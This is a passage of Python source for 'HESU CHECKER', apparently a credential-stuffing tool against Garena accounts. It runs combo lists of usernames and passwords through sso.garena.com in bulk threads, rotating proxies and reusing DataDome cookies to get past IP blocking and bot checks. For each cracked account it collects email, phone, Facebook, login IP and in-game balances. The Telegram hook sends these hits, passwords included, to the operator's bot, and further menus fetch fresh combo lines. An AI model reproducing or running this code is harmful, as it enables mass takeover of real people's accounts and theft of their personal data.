            if input(f'  {_P}▸{_RST} use saved config? (Y/n): ').strip().lower() != 'n':
                TG_BOT_TOKEN, TG_CHAT_ID = _saved_tg['token'], _saved_tg['chat_id']
                _cr, _nr = _saved_tg.get('clean', [0, 9999]), _saved_tg.get('nc', [0, 9999])
                TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = (_cr[0], _cr[1]) if TG_SEND_CLEAN else (0, 9999)
                TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = (_nr[0], _nr[1]) if TG_SEND_NOTCLEAN else (0, 9999)
                _log('SUCCESS', 'Using saved config')
                print()
            else:
                _saved_tg = None
        if not _saved_tg:
            _P = '\033[38;2;255;170;0m'
            TG_BOT_TOKEN = input(f'  {_P}▸{_RST} bot token: ').strip()
            TG_CHAT_ID = input(f'  {_P}▸{_RST} chat id: ').strip()
            if TG_SEND_CLEAN:
                print(f'    {_DIM}clean level range — min-max (e.g. 50-400), enter = all{_RST}')
                raw_clean = input(f'  {_P}▸{_RST} clean range: ').strip()
                if raw_clean and '-' in raw_clean:
                    try:
                        parts = raw_clean.split('-')
                        TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = int(parts[0].strip()), int(parts[1].strip())
                    except Exception:
                        pass
            if TG_SEND_NOTCLEAN:
                print(f'    {_DIM}not-clean level range — min-max (e.g. 1-200), enter = all{_RST}')
                raw_nc = input(f'  {_P}▸{_RST} nc range: ').strip()
                if raw_nc and '-' in raw_nc:
                    try:
                        parts = raw_nc.split('-')
                        TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = int(parts[0].strip()), int(parts[1].strip())
                    except Exception:
                        pass
            if TG_BOT_TOKEN and TG_CHAT_ID:
                _tg_save(TG_BOT_TOKEN, TG_CHAT_ID, tg_choice, [TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN], [TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN])
                print(f'  {_DIM}Config saved for next time.{_RST}')
        print()
        print(f'  {_GN}✔  Telegram configured.{_RST}')
        if TG_SEND_CLEAN:
            print(f'  {_DIM}Clean hits  : Level {_GN}{TG_LVL_MIN_CLEAN}–{TG_LVL_MAX_CLEAN}{_RST}')
        if TG_SEND_NOTCLEAN:
            print(f'  {_DIM}Not-clean   : Level {_RD}{TG_LVL_MIN_NOTCLEAN}–{TG_LVL_MAX_NOTCLEAN}{_RST}')
        print()
    def _send_tg(token, chat_id, text, silent=False):
        try:
            import requests as _req
            html_text = f'<pre><code>{text}</code></pre>'
            payload = {'chat_id': chat_id, 'text': html_text, 'parse_mode': 'HTML', 'disable_notification': silent}
            _req.post(f'https://api.telegram.org/bot{token}/sendMessage', json=payload, timeout=8)
        except Exception:
            pass
    def _build_tg_message(acc, pwd, ad, is_clean_hit):
        lvl = ad.get('codm_level', 0)
        region = ad.get('codm_region', 'N/A')
        nick = ad.get('codm_nickname', 'N/A')
        uid = ad.get('uid', 'N/A')
        country = ad.get('country', 'N/A')
        fb = ad.get('fb_info', 'N/A')
        fb_link = ad.get('fb_link', 'N/A')
        fb_username = ad.get('fb_username', 'N/A')
        shell = ad.get('shell_balance', 0)
        email_d = ad.get('email_display', 'N/A')
        mobile = ad.get('formatted_mobile', 'N/A')
        login_d = ad.get('last_login_date', 'N/A')
        login_w = ad.get('last_login_where', 'N/A')
        login_ip = ad.get('last_login_ip', 'N/A')
        login_country = ad.get('last_login_country', 'N/A')
        username = ad.get('username', 'N/A')
        nickname = ad.get('nickname', 'N/A')
        bind_status = ad.get('bind_status', 'N/A')
        game_connections = ad.get('game_connections', [])
        tag = '✔ CLEAN' if is_clean_hit else '⊘ NOT CLEAN'
        lines = [f"{'✔ CLEAN HIT' if is_clean_hit else '⊘ NOT CLEAN HIT'}", f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Account : {acc} : {pwd}', f'Status  : {tag}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Username    : {username}', f'Nickname    : {nickname}', f'UID         : {uid}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Email       : {email_d}', f'Mobile      : {mobile}', f'Facebook    : {fb}', f'FB Username : {fb_username}']
        if fb_link != 'N/A':
            lines.append(f'FB Link     : {fb_link}')
        lines.extend([f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Shells      : {shell:,}', f'Bind Status : {bind_status}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'CODM Level  : {lvl}', f'CODM Region : {region}', f'CODM IGN    : {nick}', f'CODM UID    : {ad.get("codm_uid", "N/A")}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Country     : {country}', f'Last Login  : {login_d}', f'Login Via   : {login_w}', f'Login IP    : {login_ip}', f'Login Loc   : {login_country}'])
        if game_connections and CHECK_OTHER_GAMES:
            lines.append(f'━━━━━━━━━━━━━━━━━━━━━━━━━━')
            lines.append(f'Game Connections:')
            for g in game_connections:
                gname = g.get('game', 'Unknown')
                grole = g.get('role', 'N/A')
                gregion = g.get('region', '')
                lines.append(f'• {gname}: {grole} ({gregion})' if gregion else f'• {gname}: {grole}')
        lines.extend([f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'✦  Powered by: @anon  ✦'])
        return '\n'.join(lines)
    def _maybe_send_tg(account_data):
        if account_data.get('is_error') or not account_data.get('has_codm'):
            return
        is_clean = account_data.get('is_clean', False)
        lvl = account_data.get('codm_level', 0)
        acc = account_data.get('account', '')
        pwd = account_data.get('password', '')
        msg = _build_tg_message(acc, pwd, account_data, is_clean)
        if TG_ENABLED:
            if is_clean and TG_SEND_CLEAN and (TG_LVL_MIN_CLEAN <= lvl <= TG_LVL_MAX_CLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
            elif not is_clean and TG_SEND_NOTCLEAN and (TG_LVL_MIN_NOTCLEAN <= lvl <= TG_LVL_MAX_NOTCLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
    global _TG_HOOK
    _TG_HOOK = _maybe_send_tg
    # ── Display mode: live feed handles results, dashboard only ─────
    global _DISPLAY_MODE
    _DISPLAY_MODE = 'dashboard'
    clear_screen()
    dashboard = BulkLiveDashboard(len(accounts), max_threads=num_threads)
    globals()['_dashboard_ref'] = dashboard
    dashboard.start()
    overall_done = 0
    account_index_counter = [0]
    index_lock = threading.Lock()
    stats_lock = threading.Lock()
    global _suppress_ip_prints, _ip_block_callback
    _suppress_ip_prints = True
    def _ip_block_cb(blocked: bool):
        try:
            dashboard.set_ip_blocked(blocked)
        except Exception:
            pass
    _ip_block_callback = _ip_block_cb
    _thread_local = threading.local()
    def _get_thread_resources():
        if not hasattr(_thread_local, 'session') or not hasattr(_thread_local, 'datadome'):
            _thread_local.session = _make_session()
            _thread_local.datadome = DataDomeManager()
            _thread_local.proxy_url = None
            _thread_local.proxy_line = None
            if using_proxy and proxy_manager and proxy_manager.enabled:
                proxy = proxy_manager.get_next()
                if proxy:
                    _thread_local.session.proxies.update(proxy)
                    _thread_local.proxy_url = proxy.get('http') or proxy.get('https')
                    _thread_local.proxy_line = proxy_manager._index
                    dashboard.set_current_proxy(proxy=_thread_local.proxy_url, line=_thread_local.proxy_line)
            proxy_dict = dict(_thread_local.session.proxies) if using_proxy and proxy_manager and proxy_manager.enabled else None
            picked_ck = cookie_manager.pick_cookie()
            if picked_ck:
                applyck(_thread_local.session, picked_ck)
                dd = extract_datadome_token(picked_ck)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
                    _thread_local.datadome.set_session_datadome(_thread_local.session, dd)
            else:
                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
                    _thread_local.datadome.set_session_datadome(_thread_local.session, dd)
        return (_thread_local.session, _thread_local.datadome)
    def _worker(account_line):
        if ':' not in account_line:
            return ('DONE', account_line, {})
        try:
            account, password = account_line.split(':', 1)
            account, password = account.strip(), password.strip()
            session, datadome_mgr = _get_thread_resources()
            suppress = (_BULK_MODE != 'full')
            status = processaccount(session, account, password, cookie_manager, datadome_mgr, live_stats, results_manager, file_manager, selected_file, auto_remove, suppress_print=suppress, proxy_manager=proxy_manager if using_proxy else None)
            return (status, account, {})
        except Exception:
            return ('ERROR', account_line, {})
    def _wrapped_worker(account_line):
        nonlocal overall_done
        with index_lock:
            account_index_counter[0] += 1
            my_index = account_index_counter[0]
        acc_name = account_line.split(':', 1)[0].strip() if ':' in account_line else account_line
        try:
            dashboard.record_start(my_index, acc_name)
        except Exception:
            pass
        while True:
            status, acc_name, _ = _worker(account_line)
            if status == 'IP_CHANGED':
                if hasattr(_thread_local, 'session'):
                    try:
                        _thread_local.session.close()
                    except Exception:
                        pass
                    del _thread_local.session
                if hasattr(_thread_local, 'datadome'):
                    del _thread_local.datadome
                if using_proxy and proxy_manager and proxy_manager.enabled:
                    proxy = proxy_manager.get_next()
                    if proxy:
                        proxy_url = proxy.get('http') or proxy.get('https')
                        proxy_line = proxy_manager._index
                        dashboard.set_current_proxy(proxy=proxy_url, line=proxy_line)
                time.sleep(0.5)
                continue
            break
        result_info = live_stats.pop_result()
        if result_info and result_info['success']:
            shell_balance = result_info.get('shell_balance', 0)
            dashboard.record(my_index, acc_name, success=True, is_clean=result_info['is_clean'], has_codm=result_info['has_codm'], codm_level=result_info['codm_level'], shell_balance=shell_balance)
        else:
            dashboard.record(my_index, acc_name, success=False, error_reason=(result_info or {}).get('error_reason', 'Invalid'))
        with stats_lock:
            overall_done += 1
    try:
        # Stream-batch futures: keep at most 4× thread count in flight at
        # any time. This avoids the memory churn of submitting 100k+ Future
        # objects upfront, and lets the executor focus on actual work.
        _IN_FLIGHT = num_threads * 4
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            pending = set()
            acc_iter = iter(accounts)
            # Prime the queue
            for _ in range(min(_IN_FLIGHT, len(accounts))):
                try:
                    ln = next(acc_iter)
                except StopIteration:
                    break
                pending.add(executor.submit(_wrapped_worker, ln))
            
            while pending:
                # Wait for at least one to complete, drain finished ones
                from concurrent.futures import wait, FIRST_COMPLETED
                done, pending = wait(pending, return_when=FIRST_COMPLETED, timeout=0.05)
                # Re-fill the in-flight window
                while len(pending) < _IN_FLIGHT:
                    try:
                        ln = next(acc_iter)
                    except StopIteration:
                        break
                    pending.add(executor.submit(_wrapped_worker, ln))
                # Reap results so exceptions don't get lost
                for fut in done:
                    try:
                        fut.result()
                    except Exception:
                        with stats_lock:
                            overall_done += 1
    except KeyboardInterrupt:
        _log('WARNING', 'Interrupted — shutting down...')
    finally:
        dashboard.stop()
    _suppress_ip_prints = False
    _ip_block_callback = None
    print()
    _display_final_summary(live_stats)
    _flush_auto_remove(file_manager, selected_file, force=True)
    print(f'  {_DIM}Results saved in real-time to Results/{_RST}')
    print()
    input(f'  {_DIM}↵ menu{_RST} ')

def single_check():
    clear_screen()
    display_banner()
    console = Console()
    
    console.print(Panel(
        Text("SINGLE CHECK", style="bold bright_white"),
        border_style="#ffaa00",
        box=box.ROUNDED,
        expand=False
    ))
    print()
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()

    global _PROXIES_ACTIVE
    _PROXIES_ACTIVE = False

    while True:
        global CHECK_OTHER_GAMES
        check_games = input(f'  {_CY}◇{_RST}  Check game connections? (y/N) {_CY}❯{_RST} ').strip().lower() == "y"
        
        if check_games:
            CHECK_OTHER_GAMES = True
            _log('INFO', '[dim]Will scan all Garena game connections[/dim]')
        else:
            CHECK_OTHER_GAMES = False
            _log('INFO', '[dim]CODM only — skipping other game checks[/dim]')
        
        print()
        
        live_stats = LiveStats()
        live_stats.total_accounts = 1
        
        session = _make_session()
        cookie_manager = CookieManager()
        datadome_manager = DataDomeManager()
        
        picked_ck = cookie_manager.pick_cookie()
        if picked_ck:
            applyck(session, picked_ck)
            dd = extract_datadome_token(picked_ck)
            if dd:
                datadome_manager.set_datadome(dd)
                datadome_manager.set_session_datadome(session, dd)
        else:
            proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
            datadome = get_datadome_cookie(session, proxies=proxy_dict)
            if datadome:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)
        
        account = input(f'  {_CY}❯ Username/Email{_RST}  {_CY}❯{_RST} ').strip()
        if not account:
            _log('ERROR', 'Username/Email cannot be empty.')
            print()
            continue
        
        password = input(f'  {_CY}❯ Password{_RST}  {_CY}❯{_RST} ').strip()
        if not password:
            _log('ERROR', 'Password cannot be empty.')
            print()
            continue
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results_manager = ResultsManager(combo_file_path=Path('SingleCheck'), create_dirs=False)
        results_manager.base_dir = Path(f'Single Check Output/{timestamp}')
        
        if CHECK_OTHER_GAMES:
            (results_manager.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
        
        _log('INFO', f'[dim]Checking: [bold #ffd750]{account}[/bold #ffd750]…[/dim]')
        print()
        
        processaccount(
            session,
            account,
            password,
            cookie_manager,
            datadome_manager,
            live_stats,
            results_manager,
            file_manager=None,
            combo_file_path=None,
            auto_remove=False,
            use_elegant_display=True,
            suppress_print=False
        )
        
        console.print(Panel(
            Text("SAVE RESULT?", style="bold bright_white") + Text(" (y/n)", style="dim"),
            border_style="bright_yellow",
            box=box.ROUNDED,
            expand=False
        ))
        save_response = input(f'\n  {_YL}❯{_RST} ').strip().lower()
        
        if save_response == 'y':
            for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
                (results_manager.base_dir / sub).mkdir(parents=True, exist_ok=True)
            _log('SAVE', f'Saved to [#ffd750]{results_manager.base_dir}[/#ffd750]')
        else:
            _log('INFO', '[dim]Result discarded — not saved.[/dim]')
        
        console.print(Panel(
            Text("CHECK ANOTHER?", style="bold bright_white") + Text(" (y/n)", style="dim"),
            border_style="#ffaa00",
            box=box.ROUNDED,
            expand=False
        ))
        continue_response = input(f'\n  {_MG}❯{_RST} ').strip().lower()
        
        if continue_response != 'y':
            break
        
        session.close()
        # [suppressed] session refresh log
        time.sleep(1)
        clear_screen()
        display_banner()
        console.print(Panel(
            Text("SINGLE ACCOUNT CHECK", style="bold bright_white"),
            border_style="#ffaa00",
            box=box.ROUNDED,
            expand=False
        ))
        print()

def _probe_proxy_chain(proxy_url, timeout=15.0):
    import ssl as _ssl
    try:
        parsed = urllib.parse.urlparse(proxy_url)
        host = parsed.hostname or ""
        port = parsed.port or 8080
        if not host:
            return (False, "no_host", -1.0)
        user = urllib.parse.unquote(parsed.username or "")
        pw = urllib.parse.unquote(parsed.password or "")
    except Exception:
        return (False, "parse_err", -1.0)

    auth_hdr = None
    if user:
        creds = f"{user}:{pw}".encode()
        auth_hdr = "Basic " + base64.b64encode(creds).decode()

    try:
        t0 = time.monotonic()
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)

        req = [
            "CONNECT sso.garena.com:443 HTTP/1.1",
            "Host: sso.garena.com:443",
            "Proxy-Connection: keep-alive",
        ]
        if auth_hdr:
            req.append(f"Proxy-Authorization: {auth_hdr}")
        sock.sendall(("\r\n".join(req) + "\r\n\r\n").encode())

        data = b""
        while b"\r\n\r\n" not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk

        status_line = data.decode(errors="replace").split("\r\n", 1)[0]
        parts = status_line.split(" ", 2)
        code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0

        if code != 200:
            try:
                sock.close()
            except Exception:
                pass
            if code == 407:
                return (False, "auth_failed(407)", -1.0)
            if code in (401, 403):
                return (False, f"auth_denied({code})", -1.0)
            return (False, f"connect_{code}", -1.0)

        ctx = _ssl.create_default_context()
        tls = ctx.wrap_socket(sock, server_hostname="sso.garena.com")
        tls.settimeout(timeout)

        tls.sendall(b"GET / HTTP/1.1\r\nHost: sso.garena.com\r\nConnection: close\r\nUser-Agent: probe\r\n\r\n")
        resp = b""
        try:
            while True:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 512:
                    break
        except Exception:
            pass

        latency_ms = (time.monotonic() - t0) * 1000
        try:
            tls.close()
        except Exception:
            pass

        return (True, "reachable", latency_ms)

    except socket.timeout:
        return (False, "connect_timeout", -1.0)
    except ConnectionRefusedError:
        return (False, "connection_refused", -1.0)
    except socket.gaierror:
        return (False, "dns_fail", -1.0)
    except Exception as e:
        return (False, type(e).__name__, -1.0)


def proxy_diagnostic():
    clear_screen()
    display_banner()
    console = Console()

    console.print(Panel(
        Text("PROXY DIAGNOSTIC", style="bold bright_white") +
        Text("\nHTTP CONNECT + TLS probe to sso.garena.com:443", style="dim"),
        border_style="#ffaa00", box=box.ROUNDED, expand=False
    ))
    print()

    if not Path("proxies.txt").exists():
        _log('ERROR', "proxies.txt not found.")
        input(f'  {_DIM}Press Enter…{_RST} ')
        return

    raw_lines = Path("proxies.txt").read_text(encoding="utf-8", errors="ignore").splitlines()
    proxies = []
    for line in raw_lines:
        p = _parse_proxy_line(line)
        if p:
            proxies.append(p)

    if not proxies:
        _log('ERROR', "No valid proxies found.")
        input(f'  {_DIM}Press Enter…{_RST} ')
        return

    _log('INFO', f"Testing {len(proxies)} proxies…")
    print()

    results = []
    lock = threading.Lock()

    def _run(p):
        ok, reason, lat = _probe_proxy_chain(p, timeout=20.0)
        with lock:
            results.append((p, ok, reason, lat))

    try:
        with ThreadPoolExecutor(max_workers=min(30, len(proxies))) as ex:
            futs = [ex.submit(_run, p) for p in proxies]
            for f in as_completed(futs):
                try:
                    f.result(timeout=30)
                except Exception:
                    pass
    except KeyboardInterrupt:
        pass

    ok_count = sum(1 for _, o, _, _ in results if o)
    fail_count = len(results) - ok_count

    print()
    console.print(Panel(
        Text(f"✔  Reachable   {ok_count:,}\n", style="bold bright_green") +
        Text(f"✖  Failed      {fail_count:,}\n", style="bold bright_red") +
        Text(f"◈  Total       {len(results):,}\n", style="dim"),
        title="[bold bright_yellow]DIAGNOSTIC COMPLETE[/bold bright_yellow]",
        border_style="bright_yellow", box=box.HEAVY, expand=False
    ))
    print()

    shown = 0
    for p, ok, reason, lat in results:
        if shown >= 10:
            break
        tag = "[bright_green]✔[/bright_green]" if ok else "[bright_red]✖[/bright_red]"
        line = f"  {tag}  [dim]{p[:60]}[/dim]  [yellow]{reason}[/yellow]"
        if lat > 0:
            line += f"  [cyan]{lat:.0f}ms[/cyan]"
        console.print(line)
        shown += 1
    print()

    if ok_count == 0:
        _log('ERROR', "No proxies can reach sso.garena.com. Check your proxy service.")
        _log('INFO', "Common causes: wrong auth, expired plan, wrong host/port, or service blocks Garena.")
    else:
        _log('SUCCESS', f"{ok_count} proxies look usable for Garena auth.")
    print()
    input(f'  {_DIM}↵ menu{_RST} ')


def display_main_menu():
    R  = '\033[0m'
    AM = '\033[38;2;255;170;0m'
    W  = '\033[1;97m'
    DM = '\033[2m'

    tw = _tw()
    w  = min(tw - 4, 76)
    sep = f'  {DM}{"─" * w}{R}'

    def _sec(title):
        print(f'  {AM}│{R} {AM}{title}{R}')

    def _item(n, label, desc):
        print(f'    {AM}▸{R} {W}{n:>2}{R}  {W}{label:<18s}{R}  {DM}{desc}{R}')

    print()
    _sec('CHECKER')
    _item(1,  'Full Info',       'Complete account details')
    _item(2,  'Semi Info',       'Level · Clean · Shell · Country')
    _item(3,  'No Info',         'Fastest — Valid / Invalid only')
    _item(4,  'Single Check',    'One account, full output')
    print()
    _sec('TOOLS')
    _item(5,  'Log Separator',   'Separates logs by domain')
    _item(6,  'File Splitter',   'Split lines into multiple files')
    _item(7,  'File Merger',     'Merge multiple files into one')
    _item(8,  'Watermark Detect','Detects if logs are leaked')
    _item(9,  'Encryption',      'Encrypt your code')
    print()
    _sec('GENERATORS')
    _item(10, 'CN31 Generator',  'Fresh cn31 for ML Checker')
    _item(11, 'CODM Generator',  'Valid lines for CODM')
    _item(12, 'MLBB Generator',  'Valid lines for MLBB')
    print()
    print(sep)
    print(f'  {AM}◆{R} {AM}@dvlist{R}')
    print()

    while True:
        try:
            choice = input(f'  {AM}▸{R} Select [1-12]: ').strip()
            if choice in ('1','2','3','4','5','6','7','8','9','10','11','12'):
                return choice
            _log('ERROR', 'Enter 1-12.', '    ')
        except KeyboardInterrupt:
            return '4'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Render the Hesu banner — ASCII art with bright gradient + header bar."""
    clear_screen()
    tw = _tw()
    R  = '\033[0m'
    AM = '\033[38;2;255;170;0m'
    CY = '\033[38;2;255;215;80m'
    DM = '\033[2m'
    W  = '\033[1;97m'

    banner = [
        r" ██╗  ██╗ ███████╗ ███████╗ ██╗   ██╗",
        r" ██║  ██║ ██╔════╝ ██╔════╝ ██║   ██║",
        r" ███████║ █████╗   ███████╗ ██║   ██║",
        r" ██╔══██║ ██╔══╝   ╚════██║ ██║   ██║",
        r" ██║  ██║ ███████╗ ███████║ ╚██████╔╝",
        r" ╚═╝  ╚═╝ ╚══════╝ ╚══════╝  ╚═════╝",
    ]

    row_colors = [
        (255, 190, 60,  255, 215, 100),
        (255, 170, 20,  255, 200, 70),
        (255, 150, 0,   255, 180, 40),
        (255, 130, 0,   255, 160, 30),
        (230, 110, 0,   255, 140, 20),
        (200,  90, 0,   240, 120, 10),
    ]

    def _center(s, vis_len):
        pad = max(tw - vis_len, 0)
        return ' ' * (pad // 2) + s

    w = min(tw - 4, 76)
    sep = f'  {DM}{"─" * w}{R}'

    print()
    print(sep)
    print()

    for i, line in enumerate(banner):
        r1, g1, b1, r2, g2, b2 = row_colors[i]
        gline = _grad_str(line, r1, g1, b1, r2, g2, b2)
        print(_center(gline, len(line)))

    print()

    left  = f'  {AM}◆{R} {AM}HESU CHECKER{R} {CY}v2.0{R}  {DM}—{R}  {AM}@dvlist{R}'
    right = f'{DM}garena account checker{R}  '
    lv = len(re.sub(r'\033\[[0-9;]*m', '', left))
    rv = len(re.sub(r'\033\[[0-9;]*m', '', right))
    gap = max(tw - lv - rv, 1)
    print(f'{left}{" " * gap}{right}')
    print(sep)
    print()



def generate_cn31():
    from rich.panel import Panel
    from rich import print as rprint
    from rich.padding import Padding
    from rich import box
    import requests
    import time
    import os

    clear_screen()
    display_banner()
    print()

    save_dir = os.path.join("Results", "CN31")
    os.makedirs(save_dir, exist_ok=True)
    save_file = os.path.join(save_dir, "cn31.txt")

    rprint(Padding("[dim white]Press Ctrl+C to stop and return to menu.[/dim white]\n", (0, 0, 0, 4)))

    try:
        while True:
            try:
                response = requests.get("YOUR-API-HERE", timeout=10)
                api_text = response.text.strip()
            except Exception:
                api_text = "API connection failed."

            if api_text != "API connection failed.":
                with open(save_file, "a", encoding="utf-8") as f:
                    f.write(api_text + "\n")

            rprint(Padding("[bold white]Fresh CN31 Generated[/bold white]", (0, 0, 0, 4)))

            result_panel = Panel(
                f"[bold white]{api_text}[/bold white]",
                border_style="green",
                box=box.DOUBLE_EDGE,
                expand=False
            )
            rprint(Padding(result_panel, (0, 0, 0, 4)))
            time.sleep(5)
    except KeyboardInterrupt:
        return


def generate_codm():
    from rich.panel import Panel
    from rich import print as rprint
    from rich.padding import Padding
    from rich import box
    import requests
    import time
    import os

    clear_screen()
    display_banner()
    print()

    save_dir = os.path.join("Results", "CODM_Generator")
    os.makedirs(save_dir, exist_ok=True)
    save_file = os.path.join(save_dir, "codm_lines.txt")

    rprint(Padding("[dim white]Press Ctrl+C to stop and return to menu.[/dim white]\n", (0, 0, 0, 4)))

    try:
        while True:
            try:
                response = requests.get("YOUR-API-HERE", timeout=10)
                api_text = response.text.strip()
            except Exception:
                api_text = "API connection failed."

            if api_text != "API connection failed.":
                with open(save_file, "a", encoding="utf-8") as f:
                    f.write(api_text + "\n")

            rprint(Padding("[bold white] FETCH LINES SUCCESFULLY [/bold white]", (0, 0, 0, 4)))

            result_panel = Panel(
                f"[bold white]{api_text}[/bold white]",
                border_style="green",
                box=box.DOUBLE_EDGE,
                expand=False
            )
            rprint(Padding(result_panel, (0, 0, 0, 4)))
            time.sleep(0.1)
    except KeyboardInterrupt:
        return


def generate_mlbb():
    from rich.panel import Panel
    from rich import print as rprint
    from rich.padding import Padding
    from rich import box
    import requests
    import time
    import os

    clear_screen()
    display_banner()
    print()

    save_dir = os.path.join("Results", "MLBB_Generator")
    os.makedirs(save_dir, exist_ok=True)
    save_file = os.path.join(save_dir, "mlbb_lines.txt")

    rprint(Padding("[dim white]Press Ctrl+C to stop and return to menu.[/dim white]\n", (0, 0, 0, 4)))

    try:
        while True:
            try:
                response = requests.get("YOUR-API-HERE", timeout=10)
                api_text = response.text.strip()
            except Exception:
                api_text = "API connection failed."

            if api_text != "API connection failed.":
                with open(save_file, "a", encoding="utf-8") as f:
                    f.write(api_text + "\n")

            rprint(Padding("[bold white] FETCH LINES SUCCESFULLY [/bold white]", (0, 0, 0, 4)))

            result_panel = Panel(
                f"[bold white]{api_text}[/bold white]",
                border_style="green",
                box=box.DOUBLE_EDGE,
                expand=False
            )
            rprint(Padding(result_panel, (0, 0, 0, 4)))
            time.sleep(1)
    except KeyboardInterrupt:
        return


def file_splitter():
    from rich.panel import Panel
    from rich import print as rprint
    from rich.padding import Padding
    from rich import box
    import math
    import os

    clear_screen()
    display_banner()
    print()

    file_manager = AccountFileManager()
    file_viewer = AccountFileViewer()
    combo_files = file_manager.scan_combo_folder()

    if not combo_files:
        _log('ERROR', "No combo files found in 'Combo' folder.")
        input(f'\n  {_DIM}↵ menu{_RST} ')
        return

    file_infos = []
    for file_path in combo_files:
        info = file_manager.get_file_info(file_path)
        if info:
            file_infos.append(info)

    if not file_infos:
        _log('ERROR', 'No valid combo files found.')
        input(f'\n  {_DIM}↵ menu{_RST} ')
        return

    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)

    selected_info = next((item for item in file_infos if item["path"] == selected_file), None)
    file_size_str = selected_info["size_str"] if selected_info else "Unknown"

    while True:
        try:
            prompt_panel = Panel("[white]How many lines per file?[/white]", title="[#ffd750]❯ Input[/#ffd750]", border_style="#ffd750", box=box.ROUNDED, expand=False)
            rprint(Padding(prompt_panel, (0, 0, 0, 4)))
            lines_per_file = int(input("        ❯ ").strip())
            if lines_per_file > 0:
                break
            _log('ERROR', 'Must be greater than 0.', '    ')
        except ValueError:
            _log('ERROR', 'Invalid input — enter a number.', '    ')

    stem = Path(selected_file).stem
    out_dir = os.path.join("Results", f"split_{stem}")
    os.makedirs(out_dir, exist_ok=True)

    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        total_lines = len(lines)
        if total_lines == 0:
            _log('ERROR', 'The selected file is empty.')
            input(f'\n  {_DIM}↵ menu{_RST} ')
            return

        total_files = math.ceil(total_lines / lines_per_file)

        for i in range(total_files):
            chunk = lines[i * lines_per_file : (i + 1) * lines_per_file]
            out_path = os.path.join(out_dir, f"{stem}_part_{i+1}.txt")
            with open(out_path, 'w', encoding='utf-8') as out_file:
                out_file.writelines(chunk)

        from rich.table import Table
        summary_table = Table(show_header=False, box=box.SIMPLE_HEAVY, border_style="#ffd750")
        summary_table.add_column("Property", style="dim")
        summary_table.add_column("Value", style="bold white")

        summary_table.add_row("Original File Size", file_size_str)
        summary_table.add_row("Lines per File", str(lines_per_file))
        summary_table.add_row("Total Files Created", str(total_files))
        summary_table.add_row("Saved Directory", out_dir)

        summary_panel = Panel(
            summary_table,
            title="[bold green]SPLITTING COMPLETE[/bold green]",
            subtitle="[dim #ffd750]Powered by: @dvlist[/dim #ffd750]",
            border_style="green",
            expand=False
        )
        print()
        rprint(Padding(summary_panel, (0, 0, 0, 4)))

    except Exception as e:
        _log('ERROR', f'Failed to split file: {e}')

    input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')


def file_merger():
    from rich.panel import Panel
    from rich import print as rprint
    from rich.padding import Padding
    from rich import box
    from rich.table import Table
    import os
    from datetime import datetime

    clear_screen()
    display_banner()
    print()

    merge_dir = Path("merge")
    merge_dir.mkdir(exist_ok=True)

    txt_files = list(merge_dir.glob("*.txt"))

    if not txt_files:
        _log('ERROR', "No .txt files found in 'merge' folder. Please add files and try again.")
        input(f'\n  {_DIM}↵ menu{_RST} ')
        return

    file_details = []
    total_lines_all = 0

    for fp in txt_files:
        try:
            size = fp.stat().st_size
            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                line_count = len(lines)
                total_lines_all += line_count

            size_str = f"{size} B"
            for unit in ['B', 'KB', 'MB', 'GB']:
                if size < 1024.0:
                    size_str = f"{size:.2f} {unit}"
                    break
                size /= 1024.0

            file_details.append({
                "name": fp.name,
                "size": size_str,
                "lines": line_count,
                "path": fp
            })
        except Exception as e:
            _log('WARNING', f"Could not read {fp.name}: {e}")

    if not file_details:
        _log('ERROR', 'No valid files could be read.')
        input(f'\n  {_DIM}↵ menu{_RST} ')
        return

    info_table = Table(box=box.HORIZONTALS, header_style="bold #ffaa00", border_style="#ffaa00")
    info_table.add_column("Filename", style="bold white")
    info_table.add_column("Size", justify="right", style="white")
    info_table.add_column("Lines", justify="right", style="white")

    for fd in file_details:
        info_table.add_row(fd["name"], fd["size"], str(fd["lines"]))

    panel = Panel(info_table, title="[bold white]FILES IN MERGE FOLDER[/bold white]", box=box.DOUBLE_EDGE, border_style="#ffaa00", expand=False)
    rprint(Padding(panel, (0, 0, 0, 4)))

    prompt_panel = Panel("[white]Press Enter to start merging[/white]", title="[#ffaa00]❯ Action[/#ffaa00]", border_style="#ffaa00", box=box.ROUNDED, expand=False)
    rprint(Padding(prompt_panel, (0, 0, 0, 4)))
    input("        ❯ ")

